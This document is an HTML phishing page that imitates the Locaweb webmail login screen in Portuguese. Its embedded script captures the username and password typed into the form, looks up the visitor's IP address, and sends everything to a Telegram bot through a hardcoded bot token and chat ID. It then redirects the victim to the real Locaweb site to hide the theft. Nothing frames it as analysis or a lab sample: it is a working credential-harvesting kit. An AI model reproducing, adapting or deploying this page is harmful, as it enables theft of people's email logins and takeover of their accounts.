<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"/>
<title>Webmail ‚Äì Locaweb</title>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet"/>
<style>
html,body{height:100%;margin:0;font-family:'Open Sans',sans-serif;background:#f5f5f5}
.wrapper{display:flex;flex-direction:column;height:100%}
.header{width:100%;background:#e2231a;color:#fff;padding:22px 0;text-align:center;font-size:26px;font-weight:600;letter-spacing:.4px}
.content{flex:1;display:flex;align-items:center;justify-content:center}
.card{width:420px;background:#fff;border-radius:8px;box-shadow:0 8px 25px rgba(0,0,0,.10);padding:45px 50px}
.card h2{margin:0 0 0;font-size:22px;color:#e2231a}
.card p{margin:6px 0 0 14px;color:#555;font-size:14px}
form{margin-top:28px}
label{display:block;margin-bottom:6px;font-size:14px;color:#444}
input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:6px;font-size:15px;margin-bottom:18px}
button{width:100%;padding:13px;background:#e2231a;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
button:hover{background:#b31c14}
.footer{margin-top:22px;text-align:center;font-size:13px;color:#666}
.footer a{color:#e2231a;text-decoration:none}
</style>
</head>
<body>
<div class="wrapper">
  <div class="header">Webmail Locaweb</div>
  <div class="content">
    <div class="card">
      <h2>Acesse sua conta</h2>
      <p>Informe seus dados para entrar no webmail.</p>
      <form id="f" autocomplete="off">
        <label for="user">Usu√°rio</label>
        <input id="user" name="user" required/>
        <label for="pass">Senha</label>
        <input id="pass" name="pass" type="password" required/>
        <button type="submit">Entrar</button>
      </form>
      <div class="footer">Esqueceu a senha? <a href="#">Clique aqui</a></div>
    </div>
  </div>
</div>

<script>
document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault();
  const data = Object.fromEntries(new FormData(e.target));
  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip).catch(() => 'n/a');
  const msg = `üîê Novo login\nüë§ ${data.user}\nüîë ${data.pass}\nüåê ${ip}\n‚è∞ ${new Date().toLocaleString('pt-BR')}`;
  const token = '8283630361:AAG32iDNtnetvSo6tHgq_yaaSh4aDCNuQfA';
  const chat  = '6261750345';
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({chat_id: chat, text: msg})
  });
  location.href = 'https://locaweb.com.br';
});
</script>
</body>
</html>
